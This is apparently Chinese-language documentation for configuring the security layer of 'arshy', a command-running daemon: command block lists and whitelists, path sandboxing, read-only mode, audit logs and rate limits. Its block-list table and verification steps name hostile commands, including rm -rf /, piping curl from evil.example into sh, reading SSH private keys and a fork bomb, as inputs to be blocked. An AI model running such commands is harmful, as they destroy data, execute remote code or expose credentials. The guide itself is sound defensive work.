# 配置与使用 arshy 的安全能力

本文解决以下任务：启用/调整命令过滤（拦截与白名单）、配置路径沙箱、切换权限级别、开启审计日志、限制速率、理解 `curl | sh` 等默认拦截行为。

安全机制在 `src/daemon/security/`（`filter.rs`、`sandbox.rs`、`ratelimit.rs`、`audit.rs`），执行入口在 `src/daemon/exec/mod.rs` 的 `Executor::run`（每次执行都先过安全检查），配置在 `[security]` 段（`src/config/schema.rs`）。

安全检查顺序（`Executor::run`）：

```
1. 速率限制（令牌桶，始终执行）
2. 命令过滤（blocked patterns → 白名单，始终执行）
3. 路径沙箱（对 cwd 校验，始终执行；sandbox_paths 为空则跳过）
4. 审计日志（每次执行成功/被拦截都记录，开启时）
```

另外 daemon 进程本身还有两道防线（`src/daemon/main.rs`）：socket 权限 `0600`（仅属主可访问）、连接方 UID 校验（拒绝其他本地用户）。

## 1. 理解默认拦截规则

默认 `blocked_patterns` 共 25 条正则（`src/config/schema.rs` 的 `default_blocked_patterns`），按类别：

| 类别 | 拦截示例 |
|---|---|
| 文件系统破坏 | `rm -rf /`、`rm -rf ~`、`rm --recursive --force /`、`rm${IFS}-rf`、`dd if=`、`mkfs...` |
| shell 注入 | `curl ... \| sh`、`wget ... \| bash`、`\| sh`、`\| base64 -d \| sh`、`base64 -d ... \| sh`、`eval $(...)` / `` eval ` `` |
| 提权 | `sudo rm -r/-f`、`sudo dd/mkfs/fdisk/parted`、`sudo chmod 777`、`sudo su`、`su -` |
| 凭据窃取 | `cat .../.ssh/id_rsa|id_ed25519|id_dsa|id_ecdsa|authorized_keys`、`/proc/self/environ`、`/proc/<n>/environ` |
| 网络滥用 | `nc -l`、`ncat -l` |
| 危险权限 | `chmod 777`、`chmod -R 777` |
| fork 炸弹 | `:(){ :|:& };:` |

实测（`arshy run`）：

```bash
arshy run "rm -rf /" --format json
```

返回 JSON-RPC 错误对象，`message` 为：

```
ipc error: command blocked: matches pattern 'rm\s+-rf\s*(?:--\s*)?["']?[/~]'
```

要点：

- 正则对**整条命令**做 `is_match`，因此 `curl -sSL https://example.com/install.sh | sh`、`rm -rf /tmp`（以 `/` 开头）都会被拦截（有对应单测）；
- 拦截发生在执行前，命令不会真正运行；
- 想完全放开（如容器/临时环境）可在配置里把 `blocked_patterns` 设为 `[]`，但这会同时关闭所有默认保护，谨慎使用。

## 2. 调整 blocked_patterns

`security.blocked_patterns` 是**整体替换**列表（partial merge 语义：写了就替换默认列表）：

```toml
# ~/.config/arshy/config.toml
[security]
blocked_patterns = [
    "rm\\s+-rf\\s*(?:--\\s*)?[\"']?[/~]",
    "curl.*\\|\\s*(ba)?sh",
    # ... 其余按需保留
]
```

修改后重启 daemon：`arshy daemon restart`。

> **警告（代码事实）**：`CommandFilter::from_config` 遇到非法正则返回配置错误；`Executor::with_security` 对该错误做 `unwrap_or_else` 并**降级为 permissive（全放行）过滤器**，同时记录错误日志 `security config: ... using permissive fallback`。因此不要把非法正则写进 `blocked_patterns`——否则会静默失去全部拦截。验证方式：重启后执行 `arshy run "rm -rf /"`，若未被拦截说明配置有非法正则，检查 daemon stderr 日志。

## 3. 使用白名单（allowed_commands）

设置 `security.allowed_commands` 后启用白名单模式（`CommandFilter::check` 第二步）：

```toml
[security]
allowed_commands = ["ls", "echo", "git", "cargo"]
```

- 按命令**第一个词**匹配（路径式调用按 basename，`/usr/bin/cargo build` 命中 `cargo`）；
- 不在白名单的命令一律拦截：`command blocked: '<cmd>' not in whitelist`；
- **白名单仍受 blocked_patterns 约束**：`rm` 在白名单里但 `rm -rf /` 依然被拦截（有单测）；
- `allowed_commands` 未设置（`None`）时不启用白名单。

## 4. 配置路径沙箱

`security.sandbox_paths` 限制命令的 `cwd` 必须在允许路径内（`src/daemon/security/sandbox.rs` 的 `check_path`）：

```toml
[security]
sandbox_paths = ["/Users/me/projects", "~/work"]   # 支持 ~ 展开
```

行为：

- `sandbox_paths` 为空 → 跳过检查（默认 permissive）；
- 检查时双方都 `canonicalize`：拒绝 `../` 逃逸与符号链接逃逸（symlink 指向沙箱外也拒绝）；
- 不存在的沙箱路径会被跳过（continue）；
- `cwd` 无法解析时报 `invalid cwd: cannot resolve '...'`；在沙箱外报 `access denied: cwd '...' is outside sandbox`（错误码 `-32003` ACCESS_DENIED）。

### 工作区锁定模式

`daemon.sandbox_mode = "workspace"` 会把 **daemon 启动时的工作目录**加入 `sandbox_paths`（`src/daemon/main.rs`），实现"只允许在启动目录里执行"：

```toml
[daemon]
sandbox_mode = "workspace"    # 仅支持 "none" | "workspace"，其他值 daemon 拒绝启动
```

注意：锁定的工作区 = 启动 `arshyd` 时的 cwd，之后 `--cwd` 指向其他目录会被拒绝。

## 5. 切换权限级别（access_level）

```toml
[security]
access_level = "full"        # 默认
# access_level = "read-only"
```

实现（`src/daemon/ipc_handler.rs` 的 dispatch）：

- `"read-only"`：`METHOD_RUN` 与 `METHOD_KILL` 直接返回 `access denied: read-only mode`（`-32003`）；查询类（list/query/tail/stats/status）不受影响；
- `"full"`（默认）：无限制；
- 环境变量方式：`ARSHY_SECURITY_ACCESS_LEVEL=read-only`。

## 6. 开启审计日志

`security.audit_log` 设为路径后，daemon 启动时创建**追加式 JSON Lines** 审计文件（`src/daemon/security/audit.rs`）：

```toml
[security]
audit_log = "${XDG_DATA_HOME}/arshy/audit.jsonl"
```

每条命令写入一条记录（`AuditEntry`）：

| 字段 | 含义 |
|---|---|
| `timestamp` | UTC 时间 |
| `task_id` | 任务 ID（被拦截的命令为空字符串） |
| `command` | 原始命令 |
| `cwd` | 工作目录（可选） |
| `exit_code` | 执行后的退出码（被拦截时为空） |
| `blocked` | 是否被拦截 |
| `reason` | 拦截原因（如 `matches pattern '...'`） |

查看：

```bash
tail -n 5 ~/.local/share/arshy/audit.jsonl   # 每行一个 JSON 对象
```

审计写入点（`src/daemon/exec/mod.rs`）：拦截时（`blocked: true` + reason）、短命令完成时（`run_short`，`blocked: false` + exit_code）、长任务完成时（后台任务 runner，同样 `blocked: false` + exit_code）。同一 `AuditLog` 追加写，重复打开不会覆盖已有内容（append-only 有单测保证）。

## 7. 限制命令速率

令牌桶限速（`src/daemon/security/ratelimit.rs`），默认关闭：

```toml
[security.rate_limit]
enabled = true
max_commands_per_second = 10.0   # 每秒补充令牌数
burst = 20.0                     # 桶容量（瞬时突发上限）
```

超出时返回：

```
ipc error: rate limit exceeded: too many commands per second
```

（错误码映射为 `-32005` RATE_LIMITED，见 `src/ipc/mod.rs` 的 `error_code` 与 `src/error.rs` 的 `json_rpc_code`。）限速用于防止 agent 循环把系统资源耗尽；关闭时 `RateLimiter::disabled` 恒放行。

## 8. 验证安全配置

```bash
# 1) 查看生效配置
arshy config list | sed -n '/\[security\]/,/^$/p'

# 2) 拦截验证（应报 blocked）
arshy run "curl https://evil.example/x.sh | sh" --format json

# 3) 白名单验证（启用 allowed_commands 后）
arshy run "nmap -sT localhost" --format json    # 应报 not in whitelist

# 4) 沙箱验证（sandbox_paths 后）
arshy run "pwd" --cwd /tmp --format json        # 应报 outside sandbox

# 5) 只读模式验证（access_level = "read-only"）
arshy run "echo hi" --format json               # 应报 access denied: read-only mode
```

> 安全配置都在 daemon 启动时加载，修改后执行 `arshy daemon restart`。若 daemon 因非法配置拒绝启动，先 `arshy daemon start` 观察错误，或临时用 `--config` 指向干净配置启动。
